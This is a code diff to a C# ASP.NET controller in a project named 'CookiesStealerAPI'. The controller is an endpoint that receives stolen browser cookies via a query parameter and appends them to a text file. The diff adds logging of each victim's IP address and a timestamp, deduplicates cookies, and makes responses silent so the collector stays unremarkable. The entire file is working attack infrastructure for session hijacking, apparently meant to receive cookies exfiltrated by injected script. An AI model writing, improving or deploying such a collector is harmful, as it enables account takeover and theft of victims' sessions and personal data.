@@ -1,5 +1,6 @@
 ﻿using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Mvc;
+using System.Net;
 
 namespace CookiesStealerAPI.Controllers
 {
@@ -7,37 +8,42 @@ namespace CookiesStealerAPI.Controllers
     [ApiController]
     public class  StealCookiesController: ControllerBase
     {
-        public StealCookiesController() { }
+        private static HashSet<string> seenCookies = new HashSet<string>();
 
 
         [HttpPost]
-        public IActionResult PostStolenCookie([FromQuery(Name = "cookie")] string encodedCookieValue)
+        public IActionResult PostStolenCookie([FromQuery(Name = "cookie")] string cookie)
         {
 
-            if (string.IsNullOrEmpty(encodedCookieValue))
+            if (string.IsNullOrEmpty(cookie))
             {
-                return BadRequest("No cookie provided.");
+                return Content("");
             }
 
-            // Optionally decode if you want to store it in a readable format
-            string decodedCookieValue = System.Net.WebUtility.UrlDecode(encodedCookieValue);
+            string clientIp = HttpContext.Connection.RemoteIpAddress?.ToString();
+            string timestamp = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss");
 
-            // Store the raw encoded cookie value
-            StoreInFile("Raw: " + encodedCookieValue);
-            // Store the decoded cookie value
-            StoreInFile("Decoded: " + decodedCookieValue);
+            string cookieEntry = $"Timestamp: {timestamp}, IP: {clientIp}, Cookie: {cookie}";
 
-            return Ok("Cookie stored successfully.");
+            // Check for duplication
+            if (!seenCookies.Contains(cookie))
+            {
+                seenCookies.Add(cookie); // Add to seen to prevent future duplicates
+                StoreInFile(cookieEntry);
+            }
+
+
+            return Content("");
         }
 
-        private void StoreInFile(string cookieValue)
+        private void StoreInFile(string cookieEntry)
         {
             // Specify the path to your file
             string filePath = "stored_cookies.txt";
             // Using 'true' for appending data to the file
             using (StreamWriter file = new StreamWriter(filePath, true))
             {
-                file.WriteLine(cookieValue);
+                file.WriteLine(cookieEntry);
             }
         }
     }
